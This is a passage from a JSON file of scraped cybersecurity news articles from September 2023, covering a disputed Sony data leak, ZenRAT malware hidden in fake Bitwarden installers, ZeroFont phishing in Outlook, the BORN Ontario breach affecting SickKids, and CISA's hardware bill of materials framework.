another threat actor 'MajorNelson' also claiming responsibility for the attack, and refuting RansomedVC's claims.\"You journalists believe the ransomware crew for lies. Far too gullible, you should be ashamed,\" the threat actor MajorNelson posted on BreachForums, criticizing recent news reports that have attributed the attack as real without confirmation and credited RansomedVC.\"RansomedVCs are scammers who are just trying to scam you and chase influence. Enjoy the leak.\"Contrary to posting a small sample, MajorNelson has \"leaked for free\" a 2.4 GB compressed archive, which contains 3.14 GB of uncompressed data that it claims belongs to Sony.The threat actor states that the dump contains:\"A lot of credentials for internal systems,\" and files related to:BleepingComptuer further observed the archive posted by MajorNelson had all of the files that were present in RansomedVC's small sample, but definitive attribution remains a challenge.While the data shared by the attackers does appear to belong to Sony, BleepingComputer was not able to independently verify the veracity of either threat actor's claims."
   },
   {
      "time": "2023-09-27",
      "title": "\r\n\tZenRAT Malware Uncovered in Bitwarden Impersonation - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistA new malware strain called ZenRAT has emerged, concealed within counterfeit Bitwarden installation packages.Discovered by Proofpoint, ZenRAT is a modular remote access trojan (RAT) specifically targeting Windows users with a primary focus on information theft. While the exact method of distributing the malware remains undisclosed, past instances of similar threats have often utilized SEO poisoning, adware bundles or email campaigns.ZenRAT initially appeared on a deceptive website closely resembling the legitimate Bitwarden site. This malicious website selectively displays a counterfeit Bitwarden download for Windows users while redirecting non-Windows users to a cloned opensource.com article. The installer file was initially reported on VirusTotal under a different name in late July 2023. The malware masquerades as “Piriform’s Speccy,” a gathering system specifications program, and pretends to bear the signature of Tim Kosse, a developer recognized for the Filezilla FTP/SFTP software.ZenRAT, which poses as ApplicationRuntimeMonitor.exe once launched, functions by gathering a wide range of system information upon execution, such as CPU and GPU details, operating system version, RAM, IP address, installed antivirus software and applications. This stolen data, along with browser information, is subsequently transmitted to a command-and-control (C2) server, employing a distinctive communication protocol.The communication process between ZenRAT and its C2 server is characterized by various command IDs, data sizes, hardware IDs, bot IDs, versions and builds. Notably, ZenRAT supports several commands, including transmitting logs, which reveal detailed system checks, geofencing, mutex creation, disk size verification and anti-virtualization measures. ZenRAT’s modular design implies potential for extending its capabilities, although, as of now, only the core functionality has been observed.“End users should be mindful of only downloading software directly from the trusted source, and always check the domains hosting software downloads against domains belonging to the official website,” reads the advisory."
   },
   {
      "time": "2023-09-27",
      "title": "New ZeroFont phishing tricks Outlook into showing fake AV-scans",
      "text": " Hackers are utilizing a new trick of using zero-point fonts in emails to make malicious emails appear as safely scanned by security tools in Microsoft Outlook.Although the ZeroFont phishing technique has been used in the past, this is the first time it has been documented as used in this way.In a new report by ISC Sans analyst Jan Kopriva, the researcher warns that this trick could make a massive difference in the effectiveness of phishing operations, and users should be aware of its existence and use in the wild.It involves inserting hidden words or characters in emails by setting the font size to zero, rendering the text invisible to human targets, yet keeping it readable by NLP algorithms.This attack aims to evade security filters by inserting invisible benign terms that mix with suspicious visible content, skewing AI's interpretation of the content and the result of security checks.In its 2018 report, Avanan warned that ZeroFont bypassed Microsoft's Office 365 Advanced Threat Protection (ATP) even when the emails contained known malicious keywords.Specifically, the email in question displayed a different message in Outlook's email list than in the preview pane.As you can see below, the email listing pane reads \"Scanned and secured by Isc®Advanced Threat protection (APT): 9/22/2023T6:42 AM,\" whereas the beginning of the email in the preview/reading pane displays \"Job Offer | Employment Opportunity.\"This discrepancy is achieved by leveraging ZeroFont to hide the bogus security scan message at the start of the phishing email, so while it's not visible to the recipient, Outlook still grabs it and displays it as a preview on the email listing pane.The goal is to instill a false sense of legitimacy and security in the recipient.By presenting a deceptive security scan message, the likelihood of the target opening the message and engaging with its content rises.It is possible that Outlook isn't the only email client that grabs the first portion of an email to preview a message without checking if its font size is valid, so vigilance is advised for users of other software, too."
   },
   {
      "time": "2023-09-27",
      "title": "SickKids impacted by BORN Ontario data breach that hit 3.4 million",
      "text": " The Hospital for Sick Children, more commonly known as SickKids, is among healthcare providers that were impacted by the recent breach at BORN Ontario.The top Canadian pediatric hospital disclosed that as a part of its operations, it shares personal health information with BORN Ontario \"related to pregnancy, birth and newborn care.\"On Monday, September 25th, SickKids disclosed that it is \"among the many Ontario healthcare providers\" that share sensitive health information with BORN Ontario, a perinatal and child registry that collects, interprets, shares and protects critical data about pregnancy, birth and childhood in the province of Ontario.\"BORN collects data from healthcare providers pursuant to the authority afforded to it in the Personal Health Information Protection Act (PHIPA). BORN Ontario uses this information to identify immediate care gaps affecting individuals, link information to appropriate care providers, perform health system quality assurance, and analyze data for emerging trends.\"Exposed data of those impacted by the BORN Ontario data breach included, at a minimum:Depending on the type of care received by BORN, the exposed data may also have included:Without revealing additional details about how many SickKids patients and associates were affected, the hospital also directed parties to visit BORN's aforementioned webpage, to find out if they have been impacted.It is worth noting, SickKids may not be the only hospital to be affected by the BORN Ontario security incident, and similar such disclosures may be forthcoming from other healthcare providers in the upcoming weeks."
   },
   {
      "time": "2023-09-27",
      "title": "\r\n\tCISA Publishes Hardware Bill of Materials Framework - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe US Cybersecurity and Infrastructure Security Agency (CISA) has published new guidance designed to improve the accuracy of risk assessments related to hardware products in the supply chain.The Hardware Bill of Materials Framework (HBOM) for Supply Chain Risk Management is the work of the Information and Communications Technology (ICT) Supply Chain Risk Management (SCRM) Task Force. It’s designed to encourage consistency in the naming of component attributes, a format for identifying and providing information on those components, and guidelines on what HBOM information is required based on the purpose for which the HBOM will be used.There are three main components to the framework:CISA National Risk Management Center assistant director and ICT SCRM Task Force co-chair, Mona Harrington, praised the new framework.“The HBOM Framework offers a consistent and repeatable way for vendors and purchasers to communicate about hardware components, enabling effective risk assessment and mitigation in the supply chain,” she added.“With standardized naming, comprehensive information, and clear guidance, organizations can safeguard against economic and security risks, enhancing overall resilience. By enhancing transparency and traceability through HBOM, stakeholders can identify and address potential risks within the supply chain, ensuring that the digital landscape remains robust and secure against emerging threats and challenges.”"
   }
]